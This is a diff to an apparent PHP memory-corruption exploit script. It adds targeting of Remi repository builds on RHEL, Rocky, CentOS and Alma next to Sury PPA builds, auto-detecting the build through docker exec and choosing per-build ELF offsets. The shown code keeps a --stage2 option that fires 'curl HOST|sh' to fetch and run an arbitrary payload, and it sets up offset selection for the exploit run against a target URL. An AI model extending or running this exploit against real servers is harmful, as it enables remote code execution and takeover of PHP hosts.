@@ -795,7 +795,8 @@ def main():
     ap.add_argument("--stage2", metavar="HOST", help="fire 'curl HOST|sh' (<=14B) for arbitrary payload")
     ap.add_argument("--fetcher", default="curl", choices=("curl", "wget"))
     ap.add_argument("--container", default="", help="(lab) docker name: offset derive + proof read")
-    ap.add_argument("--sury", action="store_true", help="target runs Sury PPA build (apt.sury.org)")
+    ap.add_argument("--sury", action="store_true", help="target runs Sury PPA build (apt.sury.org) on Debian/Ubuntu")
+    ap.add_argument("--remi", action="store_true", help="target runs Remi repo build on RHEL/Rocky/CentOS/Alma")
     ap.add_argument("--htdata", type=lambda x: int(x, 0), default=None, help="override htdata offset")
     ap.add_argument("--huge", type=int, default=0, help="OOM field MB (0=adaptive)")
     ap.add_argument("--threads", type=int, default=20)
@@ -888,34 +889,46 @@ def main():
         print(f"[-] no receipt after {result['attempts']} attempts (fresh-child reset per attempt expected on FPM)")
         return 1
     sury = a.sury
-    if not sury and a.container:
+    remi = a.remi
+    if not sury and not remi and a.container:
+        # Auto-detect: Sury ships libphp8.<N>.so (versioned); Remi ships
+        # libphp.so at /usr/lib64/httpd/modules/ (RHEL layout). Docker's
+        # official php:*-apache image ships /usr/lib/apache2/modules/libphp.so.
         r = subprocess.run(["docker", "exec", a.container, "sh", "-c",
                             "ls /usr/lib/apache2/modules/libphp8.*.so 2>/dev/null"],
                            capture_output=True, text=True, timeout=5)
         if r.stdout.strip():
             sury = True; print("[*] detected Sury PPA build (versioned libphp)")
+        else:
+            r = subprocess.run(["docker", "exec", a.container, "sh", "-c",
+                                "ls /usr/lib64/httpd/modules/libphp.so 2>/dev/null"],
+                               capture_output=True, text=True, timeout=5)
+            if r.stdout.strip():
+                remi = True; print("[*] detected RHEL/Rocky layout (likely Remi repo build)")
     key = ver if ver in PROFILES else SERIES_DEFAULT.get(".".join(ver.split(".")[:2]))
     prof = dict(PROFILES.get(key) or {})
     if not prof: print(f"[-] no profile for {ver}"); return 1
     if a.htdata is not None: prof["htdata"] = a.htdata
-    if sury:
-        sury_key = f"sury-{ver}"
-        off = OFFSETS.get(arch, {}).get(sury_key)
+    if sury or remi:
+        tag = "sury" if sury else "remi"
+        off_key = f"{tag}-{ver}"
+        off = OFFSETS.get(arch, {}).get(off_key)
         if not off:
-            sury_key = f"sury-{key}"
-            off = OFFSETS.get(arch, {}).get(sury_key)
+            off_key = f"{tag}-{key}"
+            off = OFFSETS.get(arch, {}).get(off_key)
         if off:
-            print(f"[*] using Sury PPA offsets ({sury_key})")
+            print(f"[*] using {tag.title()} offsets ({off_key})")
         elif a.container:
             off = elf_offsets(a.container)
         if prof["htdata"] is not None and a.htdata is None:
-            print(f"[!] Sury htdata is uncalibrated; Docker htdata may not work. Use --htdata to override.")
+            print(f"[!] {tag.title()} htdata is uncalibrated; Docker htdata may not work. Use --htdata to override.")
             prof["htdata"] = None
     else:
         off = elf_offsets(a.container) if a.container else OFFSETS.get(arch, {}).get(ver) or OFFSETS.get(arch, {}).get(key)
-    if not off: print(f"[-] no offsets for {arch}/{ver}; pass --container or --sury"); return 1
+    if not off: print(f"[-] no offsets for {arch}/{ver}; pass --container, --sury, or --remi"); return 1
     zif, dtor = off
-    print(f"[*] {a.url}  PHP {ver}/{arch}  profile {key}  reclaim {prof['s3']}{' (sury)' if sury else ''}")
+    build_tag = " (sury)" if sury else (" (remi)" if remi else "")
+    print(f"[*] {a.url}  PHP {ver}/{arch}  profile {key}  reclaim {prof['s3']}{build_tag}")
     print(f"[*] zif=0x{zif:x} dtor=0x{dtor:x} htdata={prof['htdata'] and hex(prof['htdata'])}")
 
     huge = a.huge or probe_oom(a.url, prof["huge"], zif, dtor)
